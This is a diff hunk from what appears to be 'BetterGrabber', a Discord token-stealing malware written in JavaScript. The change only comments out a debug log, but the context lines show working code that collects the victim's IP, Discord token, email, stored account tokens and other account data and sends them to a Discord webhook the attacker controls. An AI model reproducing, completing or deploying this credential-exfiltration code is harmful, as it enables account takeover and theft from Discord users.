@@ -131,7 +131,7 @@ class HideMe {
             embeds: [{"title": config.embedTitle, "footer": { "text": "Version: 1.1.5" }, "description": "[GitHub](https://github.com/HideakiAtsuyo/BetterGrabber)", "color": config.embedColor, "fields": [{ "name": "IP", "value": `\`${IP}\``, inline: false }, { "name": "Actual User Token", "value": `\`${actualUserToken.replaceAll("\"", "")||"Unknown Issue"}\``, inline: true }, { "name": "Actual User Tag With ID", "value": `\`${actualUserTag.replaceAll("\"", "")}\` - (\`${actualUserID.replaceAll("\"", "")}\`)`, inline: true }, { "name": "Actual User email", "value": `\`${actualUserEmail.replaceAll("\"", "")}\``, inline: true }, { "name": "Actual User Premium Status(Nitro)", "value": `\`${["No", "Classic", "Boost"][actualUserPremiumState]}\``, inline: true }, { "name": "Trusted Domains List", "value": `\`\`\`\n${trustedDomains == undefined ? "null" : JSON.parse(trustedDomains)["trustedDomains"]}\`\`\``, inline: false }, { "name": "Stored Tokens(From Switch Account Feature :) (ID:Token))", "value": `\`\`\`json\n${storedTokens == undefined ? "null" : storedTokens}\`\`\``, inline: false }, { "name": "Verified Games & Programs", "value": `\`\`\`json\n${verifiedGameAndProgramsList == undefined ? "null": verifiedGameAndProgramsList}\`\`\``, inline: false }]}]
         });
 
-        console.log(pD)
+        //console.log(pD); //Only Used To Check The Actual Payload Nothing More :)
 
         var SendToWebhook = https.request({ "hostname": "discord.com", "port": 443, "path": config.webHook, "method": "POST", "headers": { 'Content-Type': "application/json", 'Content-Length': pD.length } });
         SendToWebhook.on('error', (e) => {
